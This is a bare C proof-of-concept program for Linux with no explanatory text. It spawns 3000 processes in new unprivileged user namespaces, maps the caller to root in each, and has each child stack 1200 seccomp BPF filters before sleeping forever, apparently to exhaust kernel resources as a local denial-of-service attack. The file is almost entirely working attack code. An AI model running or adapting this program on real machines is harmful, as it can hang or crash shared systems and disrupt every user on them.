#define _GNU_SOURCE
#include <errno.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/audit.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <sys/prctl.h>
#include <sched.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>
#define X32_SYSCALL_BIT 0x40000000
#define ARRAY_SIZE(arr) (sizeof(arr) / sizeof((arr)[0]))

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                         } while (0)

#define STACK_SIZE (8 * 1024)
static char thread_stack[3001][STACK_SIZE];

static int
install_filter(int syscall_nr, int t_arch, int f_errno)
{
    // you can install any bpf prog you want
    // in this function
    unsigned int upper_nr_limit = 0xffffffff;
    if (t_arch == AUDIT_ARCH_X86_64)
        upper_nr_limit = X32_SYSCALL_BIT - 1;
    struct sock_filter filter[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 (offsetof(struct seccomp_data, arch))),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, t_arch, 0, 5),
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 (offsetof(struct seccomp_data, nr))),
        BPF_JUMP(BPF_JMP | BPF_JGT | BPF_K, upper_nr_limit, 3, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, syscall_nr, 0, 1),
        BPF_STMT(BPF_RET | BPF_K,
                 SECCOMP_RET_ERRNO | (f_errno & SECCOMP_RET_DATA)),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
    };
    struct sock_fprog prog = {
        .len = ARRAY_SIZE(filter),
        .filter = filter,
    };
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)) {
        perror("seccomp");
        return 1;
    }
    return 0;
}

int thread_fn(void *arg) {
  int err;
  sleep(2);
  for (int i = 0; i < 1200; ++i) {
    err = install_filter(311, 0xC000003E, 1);
    if (err == -1)
      errExit("filter installation");
  }
  while(1) {
    sleep(4000000000U);
  }
  return 0;
}

int main(int argc, char **argv)
{
  int thread_pid;
  char path[512], mapstr[100];
  unsigned int uid = getuid();
  sprintf(mapstr, "0\t%d\t1\n", uid);
  for (int i = 0; i < 3000; ++i) {
    thread_pid = clone(thread_fn, thread_stack[i] + STACK_SIZE, \
        SIGCHLD | CLONE_NEWUSER, NULL);
    if (thread_pid == -1)
      errExit("clone");
    // map current pid to root in new userns
    sprintf(path, "/proc/%d/uid_map", thread_pid);
    int umapfd = open(path, O_WRONLY);
    int res = write(umapfd, mapstr, 100);
    // if success, the new thread owns 
    // CAP_SYS_ADMIN in the new userns
    if (res == -1)
      errExit("write uid_map");
  }
  while(1);
}
